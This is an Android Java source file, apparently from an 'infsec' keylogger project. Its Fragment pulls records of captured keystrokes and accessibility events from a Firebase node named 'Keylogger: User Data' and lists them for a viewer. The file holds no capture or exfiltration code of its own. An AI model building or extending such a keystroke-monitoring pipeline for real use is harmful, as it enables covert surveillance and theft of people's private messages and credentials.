package com.maemresen.infsec.keyloggerParent;

import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;

import com.airbnb.lottie.LottieAnimationView;
import com.airbnb.lottie.LottieDrawable;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class AllRecordsFragment extends Fragment {
    
    private DatabaseReference allRecordsRef;
    private RecyclerView recyclerView;
    private DataAdapter adapter;
    private List<DataItem> dataList;
    private LottieAnimationView loadingAnimationView;
    private boolean isLoading;
    
    @Nullable
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {
        View rootView = inflater.inflate(R.layout.all_records, container, false);
        
        recyclerView = rootView.findViewById(R.id.AllRecordsrecycler);
        recyclerView.setLayoutManager(new LinearLayoutManager(getContext()));
        dataList = new ArrayList<>();
        adapter = new DataAdapter(dataList);
        recyclerView.setAdapter(adapter);
        
        loadingAnimationView = rootView.findViewById( R.id.animationView2 );
        loadingAnimationView.playAnimation();
        
        // Get a reference to the "All Records" node in the Firebase Realtime Database
        Date now = DateTimeHelper.getCurrentDay();
        SimpleDateFormat dateFormat = new SimpleDateFormat( "dd-MM-yyyy", Locale.getDefault() );
        String databaseName = dateFormat.format( now );
        String ownerName = Build.MODEL;
        allRecordsRef = FirebaseDatabase.getInstance().getReference("Keylogger: User Data")
                .child(ownerName)
                .child(databaseName)
                .child("All Records");
        
        // Add a ValueEventListener to listen for changes in the data
        allRecordsRef.addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                dataList.clear();
                
                for (DataSnapshot dateSnapshot : dataSnapshot.getChildren()) {
                    for (DataSnapshot recordSnapshot : dateSnapshot.getChildren()) {
                        String uuid = recordSnapshot.child("uuid").getValue(String.class);
                        String keyLogDate = recordSnapshot.child("keyLogDate").getValue(String.class);
                        String accessibilityEvent = recordSnapshot.child("accessibilityEvent").getValue(String.class);
                        String msg = recordSnapshot.child("msg").getValue(String.class);
                        
                        DataItem dataItem = new DataItem(uuid, keyLogDate, accessibilityEvent, msg);
                        dataList.add(dataItem);
                    }
                }
                
                // Notify the adapter that the data has changed
                adapter.notifyDataSetChanged();
    
                isLoading = false;
                loadingAnimationView.setVisibility( View.GONE );
            }
            
            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {
                Log.e("FirebaseError", "Data retrieval canceled: " + databaseError.getMessage());
            }
        });
        
        return rootView;
    }
    @Override
    public void onResume() {
        super.onResume();
        
        if (isLoading) {
            // Show the loading animation view
            loadingAnimationView.setVisibility( View.VISIBLE );
        } else {
            // Hide the loading animation view
            loadingAnimationView.setVisibility( View.GONE );
        }
    }
}